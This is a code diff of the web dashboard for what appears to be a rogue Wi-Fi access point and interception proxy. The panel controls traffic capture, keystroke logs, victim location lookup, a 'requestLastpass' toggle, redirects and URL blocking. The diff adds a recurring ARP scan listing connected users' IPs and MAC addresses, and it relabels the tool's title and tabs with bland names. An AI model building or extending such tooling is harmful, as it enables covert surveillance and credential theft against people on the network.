@@ -2,11 +2,7 @@
 {{template "header.html" .}}
 
 <header class="row">
-  <h1 class="col-md-4">Shakespeare Dashboard</h1>
-  <button class="btn btn-success" id="getdata">Fetch All Data</button>
-  <svg height="30" width="30">
-  <circle id="internetconnected" cx="15" cy="15" r="10" stroke="black" stroke-width="3" fill="red" />
-</svg>
+  <h1 class="col-md-4">Welcome</h1>
   <p></p>
 </header>
 <div class="main row">
@@ -15,19 +11,26 @@
       <!-- Default panel contents -->
       <div class="panel-heading">
         <h5>Proxy Controls</h5>
+
         <div id="spinner" style="position: absolute; top: 0px; left: 0px; right: 0px; bottom: 0px;"></div>
       </div>
 
       <!-- List group -->
       <ul class="list-group">
+
         <li class="list-group-item">
-          <!-- <div class="onoffswitch">
-            <input type="checkbox" name="startSimpleProxy" class="onoffswitch-checkbox" id="startSimpleProxy">
-            <label class="onoffswitch-label" for="startSimpleProxy">
-              <span class="onoffswitch-inner"></span>
-              <span class="onoffswitch-switch"></span>
-            </label>
-          </div> -->
+
+          <div class="onoffswitch">
+          <button class="btn btn-success" id="getdata">Fetch</button>
+          <svg height="30" width="30">
+          </div>
+          <h4>Fetch data from server</h4>
+          <small>redirect, blocking urls and latest redirect pages come from server. This needs an internet connection</small>
+
+        </li>
+
+        <li class="list-group-item">
+
           <div class="onoffswitch">
               <input type="checkbox" name="onoffswitch" class="onoffswitch-checkbox" id="toggleHarCollection">
               <label class="onoffswitch-label" for="toggleHarCollection">
@@ -39,6 +42,9 @@
           <small>Toggle the HAR collector</small>
 
         </li>
+
+
+
 
         <!-- <li class="list-group-item">
           <div class="onoffswitch">
@@ -172,12 +178,12 @@
       <!-- Nav tabs -->
       <ul class="nav nav-tabs" role="tablist">
         <!-- <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li> -->
-        <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Har Viewer</a></li>
+        <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Overview</a></li>
         <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
         <li role="presentation"><a href="#locations" onclick="mapLoad()" aria-controls="locations" role="tab" data-toggle="tab">Locations</a></li>
-        <li role="presentation"><a href="#ConnectWifi" aria-controls="ConnectWifi" role="tab" data-toggle="tab">Connect To Wifi</a></li>
-        <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab">Create Access Points</a></li>
-        <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover Local WiFi Requests</s></a></li>
+        <li role="presentation"><a href="#ConnectWifi" aria-controls="ConnectWifi" role="tab" data-toggle="tab">1 --> Connect</a></li>
+        <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab">2 --> Create</a></li>
+        <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover</s></a></li>
         
       </ul>
 
@@ -200,7 +206,17 @@
             <!-- <button class="btn btn-danger" id="deletehars">Delete current data</button> -->
             <!-- dropdown button -->
           </nav>
-
+          <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th>IP</th>
+                  <th>MAC Address</th>
+                </tr>
+              </thead>
+              <tbody id="currentusers">
+              </tbody>
+            </table>
+          </ul>
           <div id='har-view'></div> <!-- har viewer here -->
         </div>
         <div role="tabpanel" class="tab-pane" id="locations">
@@ -250,11 +266,6 @@
             </div>
           </div>
         </div>
-        <div role="tabpanel" class="tab-pane" id="SelectUser">
-          <ul>
-            <li>Select user here and it will be updated above</li>
-          <ul>
-        </div>
       </div>
 
     </div>
@@ -299,8 +310,12 @@ var opts = {
         console.log(data)
       })
   }
-  $("#getdata").click( function () { handleGetRequest("FetchAllData")});
-
+  $("#getdata").click( function () { 
+    $("#getdata").removeClass("btn-success")
+    $("#getdata").removeClass("btn-danger")
+    $("#getdata").addClass("btn-primary")
+    handleGetRequest("FetchAllData")
+  });
   $("#toggleHarCollection").click( function () { handleGetRequest("ToggleHarCollection")});
 
   $("#startSimpleProxy").click( function () { handleGetRequest("StartSimpleProxy")});
@@ -448,20 +463,35 @@ function pingTest() {
     console.log(ping)
     if (ping.Response != "") {
       $("#getdata").prop('disabled', false);
-      $("#internetconnected").attr("fill", "green");
+      $("#getdata").removeClass("btn-danger")
+      $("#getdata").addClass("btn-success")
+      setTimeout(pingTest, 20000); //test if we have an internet connection
     } else {
       $("#getdata").prop('disabled', true);
-      $("#internetconnected").attr("fill", "red");
+      $("#getdata").removeClass("btn-success")
+      $("#getdata").addClass("btn-danger")
+      setTimeout(pingTest, 5000); //test if we have an internet connection
     }
   })
-  setTimeout(pingTest, 2000); //test if we have an internet connection
+  
 }
 
+function arpScan() {
+  $("#currentusers").html("");
+  $.get("/ArpScan", function(data) {
+    $.each(data, function(key, value){
+      console.log(key, " ", value)
+      $("#currentusers").append("<tr><td>" + key + "</td><td>" + value + "</td></tr>");
+    });
+    
+  });
+  setTimeout(arpScan, 10000);
+}
 //get the latest hars that are available
 $(document).ready(function() {
   
   setTimeout(captureKeyLogs, 5000);
-  setTimeout(pingTest(), 5000); //test if we have an internet connection
+  pingTest() //test if we have an internet connection
   console.log(spinner)
   target = document.getElementById('spinner');
   spinner = new Spinner(opts);
@@ -474,9 +504,43 @@ $(document).ready(function() {
     connectionType = this.innerHTML;
     $('#connectionButton').html(this.innerHTML + " <span class=\"caret\"></span>");
   });
+  checkProxyState();
+  arpScan()
   initHarView();
 
 })
+
+function checkProxyState() {
+  $.get("/GetField?field=0", function(data) {
+    console.log("0: ", data)
+    $("#toggleHarCollection").prop('checked', data);
+  })
+    $.get("/GetField?field=1", function(data) {
+    console.log("1: ", data)
+    $("#triggerRedirects").prop('checked', data);
+  })
+    $.get("/GetField?field=2", function(data) {
+    console.log("2: ", data)
+    $("#triggerBlocks").prop('checked', data);
+  })
+    $.get("/GetField?field=3", function(data) {
+    console.log("3: ", data)
+    $("#triggerWolfPack").prop('checked', data);
+  })
+    $.get("/GetField?field=4", function(data) {
+    console.log("4: ", data)
+    $("#keylogger").prop('checked', data);
+  })
+    $.get("/GetField?field=5", function(data) {
+    console.log("5: ", data)
+    $("#getLocation").prop('checked', data);
+  })
+    $.get("/GetField?field=6", function(data) {
+    console.log("6: ", data)
+    $("#requestLastpass").prop('checked', data);
+  })
+    
+}
 
 </script>
 
